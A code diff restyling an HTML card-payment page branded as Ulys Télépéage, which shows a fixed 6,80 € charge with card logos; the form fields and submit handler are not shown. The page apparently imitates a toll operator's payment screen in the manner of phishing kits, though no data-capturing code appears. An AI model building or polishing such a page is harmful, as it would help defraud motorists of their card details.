@@ -6,7 +6,120 @@
   <title>Paiement – Ulys Télépéage</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
   <style>
-    /* Spinner overlay */
+    :root {
+      --accent: #ff8000;
+      --text-dark: #1a1a1a;
+      --radius: 20px;
+    }
+
+    body {
+      font-family: 'Source Sans Pro', sans-serif;
+      background-color: #f9f9f9;
+      color: var(--text-dark);
+      margin: 0;
+      padding: 0;
+    }
+
+    .site-nav {
+      background-color: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 1rem 1.5rem;
+    }
+
+    .navbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .logo {
+      height: 50px;
+    }
+
+    .container {
+      max-width: 650px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: var(--radius);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+      padding: 2.5rem;
+    }
+
+    .form-logo-center {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.2rem;
+    }
+
+    .form-logo-center img {
+      height: 60px;
+    }
+
+    .amount-text {
+      text-align: center;
+      font-size: 1.05rem;
+      margin-bottom: 2rem;
+      color: #333;
+    }
+
+    .accepted-logos {
+      display: flex;
+      justify-content: center;
+      gap: 1.2rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .accepted-logos img {
+      height: 28px;
+      width: auto;
+      opacity: 0.9;
+    }
+
+    form label {
+      display: block;
+      margin: 1rem 0 0.4rem;
+      font-weight: 600;
+    }
+
+    form input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 1px solid #ccc;
+      border-radius: var(--radius);
+      font-size: 1rem;
+      background-color: #fafafa;
+    }
+
+    .btn {
+      margin-top: 2rem;
+      width: 100%;
+      padding: 0.85rem;
+      background-color: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #e57200;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      font-size: 0.9rem;
+      color: #777;
+    }
+
     #spinnerOverlay {
       display: none;
       position: fixed;
@@ -27,88 +140,36 @@
     }
 
     @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .accepted-logos {
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-      margin-bottom: 1rem;
-    }
-
-    .accepted-logos img {
-      height: 30px;
-      width: auto;
-    }
-
-    .card {
-      max-width: 650px;
-      margin: 2rem auto;
-      padding: 2.5rem;
-      background-color: #fff;
-      border-radius: 20px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-    }
-
-    .form-logo-center {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-
-    .form-logo-center img {
-      height: 55px;
-      object-fit: contain;
-    }
-
-    .amount-text {
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #1a1a1a;
-      margin-bottom: 2rem;
-    }
-
-    h1 {
-      display: none;
-    }
-
-    .header-toggle button {
-      cursor: pointer;
+      to {
+        transform: rotate(360deg);
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- NAVBAR SIMPLIFIÉE -->
+  <!-- NAVBAR -->
   <div class="site-nav">
     <nav class="navbar">
-      <div class="navbar-left">
-        <a href="index.html" class="logo-container">
-          <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo"/>
-        </a>
-        <div class="header-toggle">
-          <button class="toggle active" onclick="toggleUserType(this)">Particulier</button>
-          <button class="toggle" onclick="toggleUserType(this)">Professionnel</button>
-        </div>
-      </div>
+      <a href="index.html">
+        <img src="assets/images/logo-ulys2.png" alt="Ulys" class="logo"/>
+      </a>
     </nav>
   </div>
 
+  <!-- CONTENU -->
   <main class="container">
     <div class="card">
       <div class="form-logo-center">
         <img src="assets/images/logo-ulys2.png" alt="Ulys">
       </div>
 
-      <div class="amount-text">Montant à régler : 6,80 €</div>
+      <div class="amount-text">Vous allez régler un montant de 6,80 €</div>
 
       <div class="accepted-logos">
         <img src="assets/images/visa.png" alt="Visa">
         <img src="assets/images/Mastercard.png" alt="Mastercard">
-        <img src="assets/images/Amex.png" alt="American Express">
+        <img src="assets/images/Amex.png" alt="Amex">
       </div>
 
       <form id="paymentForm">
@@ -136,11 +197,6 @@
   </footer>
 
   <script>
-    function toggleUserType(button) {
-      document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
-      button.classList.add("active");
-    }
-
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
